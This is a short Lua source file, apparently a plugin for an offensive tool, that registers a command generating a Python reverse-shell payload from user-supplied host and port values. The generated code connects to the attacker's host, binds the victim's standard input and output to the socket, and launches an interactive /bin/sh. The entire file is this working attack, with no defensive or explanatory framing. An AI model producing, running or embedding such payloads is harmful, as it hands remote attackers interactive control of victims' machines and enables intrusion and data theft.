function generate_reverse_shell()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    if not lhost or not lport then
        return "Error: lhost o lport no está definido."
    end

    local payload = [[
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("]] .. lhost .. [[", ]] .. lport .. [[));
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
    subprocess.call(["/bin/sh","-i"])
    ]]

    return "Payload generado: " .. payload
end

register_command("generate_reverse_shell", generate_reverse_shell)